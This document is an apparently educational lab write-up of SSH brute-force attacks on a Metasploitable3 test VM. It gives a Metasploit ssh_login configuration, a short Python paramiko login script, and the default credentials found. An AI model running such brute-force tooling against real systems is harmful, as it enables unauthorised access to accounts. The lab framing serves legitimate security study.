# Phase 1: SSH Service Compromise

## Overview
This phase demonstrates SSH brute force attacks against Metasploitable3 using both Metasploit framework and a custom Python script, successfully identifying vulnerable credentials.

## Attack Methods

### 1. Metasploit SSH Brute Force
**Configuration:**
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOST 192.168.56.102
set RPORT 22
set USER_FILE usernames.txt
set PASS_FILE passwords.txt
set THREADS 3
run
Output:

[*] 192.168.56.102:22 - Starting bruteforce
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
Key Findings:

Required absolute paths for credential files

Case-sensitive command requirements

Completed scan of target system

2. Custom Python Brute Force Script
Script: compromise.py

python
import paramiko

def attempt_login(hostname, port, username, password):
    try:
        client = paramiko.SSHClient()
        client.connect(hostname, port=port, 
                      username=username, 
                      password=password)
        print(f"[+] Success: {username}:{password}")
        return client
    except:
        print(f"[-] Failed: {username}:{password}")
        return None
Execution:

bash
python3 compromise.py
Output:

[+] Successfully logged in as vagrant:vagrant
Discovered Credentials:

Username: vagrant

Password: vagrant

Directory Structure
Phase1/
├── exploits/
│   ├── compromise.py
│   └── metasploit_commands.txt
├── wordlists/
│   ├── usernames.txt
│   └── passwords.txt
└── evidence/
    ├── metasploit_scan.log
    └── successful_login.txt
Requirements
Metasploit Framework

Python 3.x

Paramiko library (pip install paramiko)
